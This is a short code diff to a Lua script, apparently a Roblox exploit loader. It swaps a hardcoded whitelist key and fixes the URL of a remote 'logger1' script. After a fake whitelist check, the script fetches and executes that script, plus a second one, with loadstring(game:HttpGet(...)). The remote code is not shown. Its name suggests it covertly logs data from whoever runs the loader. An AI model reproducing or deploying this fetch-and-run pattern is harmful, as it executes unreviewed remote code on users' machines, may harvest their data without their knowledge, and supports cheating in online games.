@@ -44,7 +44,7 @@ Enter.TextScaled = true
 Enter.TextSize = 14.000
 Enter.TextWrapped = true
 Enter.MouseButton1Down:connect(function()
-	if Key.Text == "1-23x_$24" then
+	if Key.Text == "21#$_21" then
 		Enter.Text = "Checking whitelist..."
 		wait(2)
 		Enter.Text = "Whitelisted!"
@@ -55,7 +55,7 @@ Enter.MouseButton1Down:connect(function()
 		wait(1)
 		Enter.Text = "Welcome to creepy"
 		wait(1)
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/babysharkleader280babysharkleader280/log-1/main/logger1"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/babysharkleader280/log-1/main/logger1"))()
 		Login.Visible = false
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/babysharkleader280/creepyV/main/creepyantigui"))()
 	else
